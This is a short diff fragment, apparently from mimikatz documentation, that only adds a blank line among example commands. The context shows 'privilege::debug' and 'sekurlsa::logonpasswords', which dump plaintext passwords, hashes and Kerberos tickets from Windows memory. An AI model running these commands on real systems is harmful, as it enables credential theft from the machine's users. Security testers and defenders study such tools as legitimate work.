@@ -14,6 +14,7 @@ It's now well known to extract plaintexts passwords, hash, PIN code and kerberos
 
 
 mimikatz # privilege::debug
+
 Privilege '20' OK
  
 mimikatz # sekurlsa::logonpasswords
